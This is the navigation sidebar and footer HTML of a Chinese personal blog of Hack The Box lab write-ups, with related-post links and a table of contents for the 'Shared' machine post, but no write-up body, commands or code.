class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-03-20</div><div class="title">HTB靶机：Armageddon</div></div></a></div><div><a href="/2023/03/20/HTB%E9%9D%B6%E6%9C%BA%EF%BC%9ADriver/" title="HTB靶机：Driver"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-03-20</div><div class="title">HTB靶机：Driver</div></div></a></div><div><a href="/2023/03/20/HTB%E9%9D%B6%E6%9C%BA%EF%BC%9AForgot/" title="HTB靶机：Forgot"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-03-20</div><div class="title">HTB靶机：Forgot</div></div></a></div><div><a href="/2023/03/20/HTB%E9%9D%B6%E6%9C%BA%EF%BC%9ARainyDay/" title="HTB靶机：RainyDay"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-03-20</div><div class="title">HTB靶机：RainyDay</div></div></a></div><div><a href="/2023/03/20/HTB%E9%9D%B6%E6%9C%BA%EF%BC%9APhotobomb/" title="HTB靶机：Photobomb"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-03-20</div><div class="title">HTB靶机：Photobomb</div></div></a></div><div><a href="/2023/03/20/HTB%E9%9D%B6%E6%9C%BA%EF%BC%9ARedPanda/" title="HTB靶机：RedPanda"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-03-20</div><div class="title">HTB靶机：RedPanda</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/le0le.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Le0le</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">11</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">1</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#HTB%E9%9D%B6%E6%9C%BA%EF%BC%9AShared"><span class="toc-number">1.</span> <span class="toc-text">HTB靶机：Shared</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%B6%E6%9C%BA%E4%BF%A1%E6%81%AF%EF%BC%9A"><span class="toc-number">1.1.</span> <span class="toc-text">靶机信息：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%EF%BC%9A"><span class="toc-number">1.2.</span> <span class="toc-text">信息收集：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%EF%BC%9A"><span class="toc-number">1.2.1.</span> <span class="toc-text">端口扫描：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#80"><span class="toc-number">1.2.2.</span> <span class="toc-text">80:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%90%E5%9F%9F%E5%90%8D%E6%89%AB%E6%8F%8F%EF%BC%9A"><span class="toc-number">1.2.3.</span> <span class="toc-text">子域名扫描：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%98%E5%9C%A8cookie-sql%E6%B3%A8%E5%85%A5"><span class="toc-number">1.3.</span> <span class="toc-text">存在cookie-sql注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#user-txt"><span class="toc-number">1.4.</span> <span class="toc-text">user.txt</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#pspy64"><span class="toc-number">1.4.1.</span> <span class="toc-text">pspy64:</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83%EF%BC%9A"><span class="toc-number">1.5.</span> <span class="toc-text">提权：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%93%E5%B0%BE%EF%BC%9A"><span class="toc-number">1.6.</span> <span class="toc-text">结尾：</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/03/20/HTB%E9%9D%B6%E6%9C%BA%EF%BC%9ASupport/" title="HTB靶机：Support">HTB靶机：Support</a><time datetime="2023-03-20T13:30:23.000Z" title="发表于 2023-03-20 21:30:23">2023-03-20</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/03/20/HTB%E9%9D%B6%E6%9C%BA%EF%BC%9AShoppy/" title="HTB靶机：Shoppy">HTB靶机：Shoppy</a><time datetime="2023-03-20T13:28:33.000Z" title="发表于 2023-03-20 21:28:33">2023-03-20</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/03/20/HTB%E9%9D%B6%E6%9C%BA%EF%BC%9AShared/" title="HTB靶机：Shared">HTB靶机：Shared</a><time datetime="2023-03-20T13:26:35.000Z" title="发表于 2023-03-20 21:26:35">2023-03-20</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/03/20/HTB%E9%9D%B6%E6%9C%BA%EF%BC%9APhotobomb/" title="HTB靶机：Photobomb">HTB靶机：Photobomb</a><time datetime="2023-03-20T13:23:55.000Z" title="发表于 2023-03-20 21:23:55">2023-03-20</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/03/20/HTB%E9%9D%B6%E6%9C%BA%EF%BC%9AForgot/" title="HTB靶机：Forgot">HTB靶机：Forgot</a><time datetime="2023-03-20T12:29:08.000Z" title="发表于 2023-03-20 20:29:08">2023-03-20</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By Le0le</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">Hi, welcome to my <a href="https://le623.github.io">blog</a>!</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">简</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><div class="js-pjax"></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/fireworks.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
